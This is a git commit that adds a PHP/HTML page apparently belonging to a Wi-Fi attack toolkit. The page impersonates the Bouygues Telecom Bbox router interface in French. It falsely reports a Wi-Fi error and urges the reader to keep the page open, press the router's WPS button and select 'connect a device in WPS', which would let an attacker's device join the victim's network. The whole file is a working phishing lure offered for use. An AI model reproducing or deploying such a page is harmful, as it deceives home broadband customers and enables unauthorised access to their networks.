b171021470fab5d107522cf49a5c227fff85f0a4
Koala633 <flow747@yahoo.fr>
2017-04-16 00:09:03 +0200

    Add files via upload

---
+++ hostbase/fakepagewps/bbox/index.php
@@ -0,0 +1,27 @@
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+<title>Bienvenue sur votre interface Bouygues</title>
+<link href="/css/centrage.css" rel="stylesheet" type="text/css" />
+
+
+
+<IMG class="displayed" src="bbox2.png">
+
+</head>
+<body>
+<p><font color="teal">Une erreur est survenue sur votre réseau wi-fi, veuillez vous brancher a votre Bbox de Bouygues telecom par cable ethernet et réeinitialiser les connexions sans fil.<b>Gardez cette page ouverte,</b> une fois le cable branché accédez a l'interface d'administration de votre Bbox via le lien suivant:</p>
+</br>
+<a href="http://192.168.1.254">Interface de gestion.</a>
+</br>
+</br>
+<p>Si c'est la première fois que vous voyez cette page, votre Bbox de Bouygues telecom vous demandera d'appuyer sur le bouton wifi pendant 5 secondes de manière a vous authentifier.Une fois cette étape passée, cliquez sur "connecter un appareil en WPS".L'authentification par WPS va réeinitialiser la connexion wifi et vous évite de rentrer la clé de sécurité, au besoin suivez l'aide ci-dessous.</p>
+</br>
+</br>
+<IMG class="displayed" src="bbox1.png">
+
+</body>
+</html>
+
